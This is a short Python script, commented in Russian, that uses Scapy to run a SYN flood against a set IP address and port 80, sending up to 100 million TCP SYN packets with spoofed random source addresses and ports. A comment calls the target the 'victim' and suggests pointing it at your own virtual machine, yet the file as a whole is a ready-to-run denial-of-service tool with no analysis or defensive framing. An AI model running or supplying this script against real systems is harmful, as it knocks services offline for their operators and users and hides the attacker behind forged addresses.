from scapy.all import IP, TCP, RandIP, RandShort, send, conf
import time
import sys

# Убедитесь, что используется Npcap
conf.use_pcap = True

# Параметры
TARGET_IP = "192.168.0.138"  # IP жертвы (замените на IP вашей VM или другой машины)
TARGET_PORT = 80  # Целевой порт
COUNT = 100000000  # Количество пакетов

def syn_flood():
    try:
        print(f"Запуск SYN Flood на {TARGET_IP}:{TARGET_PORT}...")
        print(f"Используется Npcap: {conf.use_pcap}")
        for i in range(COUNT):
            packet = (
                IP(src=RandIP(), dst=TARGET_IP) /
                TCP(sport=RandShort(), dport=TARGET_PORT, flags="S")
            )
            send(packet, verbose=0)
            if (i + 1) % 100 == 0:
                print(f"Отправлено {i + 1} пакетов...")
        print("SYN Flood завершён.")
    except Exception as e:
        print(f"Ошибка при отправке пакетов: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        syn_flood()
    except KeyboardInterrupt:
        print("\nАтака остановлена.")